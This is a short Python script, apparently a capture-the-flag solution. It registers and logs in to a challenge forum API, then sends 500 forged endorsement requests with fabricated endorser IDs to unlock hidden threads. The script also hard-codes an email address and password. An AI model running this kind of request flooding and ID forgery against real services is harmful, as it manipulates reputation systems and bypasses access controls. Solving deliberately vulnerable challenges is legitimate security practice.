
import requests

# Configuration
url = "https://forum.chall.trojanc.tf/api"  # Change this
endorse_url = url + "/endorse"
register_url = url + "/register"
login_url = url + "/login"
threads_url = url + "/all/threads"

userID = "krzb88p9"  # Your userID

register_payload = {
    "email":"w.v.hoof@eshatrojan.nl",
    "password":"take-rubble-legacy",
    "username":"wouter"
}
register = requests.post(url=register_url, json=register_payload)
print(register.json())

login_payload = {
    "email":"w.v.hoof@eshatrojan.nl",
    "password":"take-rubble-legacy"
}
login = requests.post(url=login_url, json=login_payload)

print(login.json())
userID = login.json()["id"]

hidden_payload = {
    "userID": userID,
}
hidden = requests.post(url=threads_url, json=hidden_payload)

# if hidden.status_code != 200:
# Send 500 requests with different endorserIDs
for i in range(1, 501):
    endorserID = f"endorser{i}"

    payload = {
        "userID": userID,
        "endorserID": endorserID
    }

    try:
        response = requests.post(endorse_url, json=payload)
        print(f"Request {i}: {response.json()}")
    except requests.exceptions.RequestException as e:
        print(f"Request {i} failed: {e}")

hidden_payload = {
    "userID": userID,
}
hidden = requests.post(url=threads_url, json=hidden_payload)

print(hidden.json())
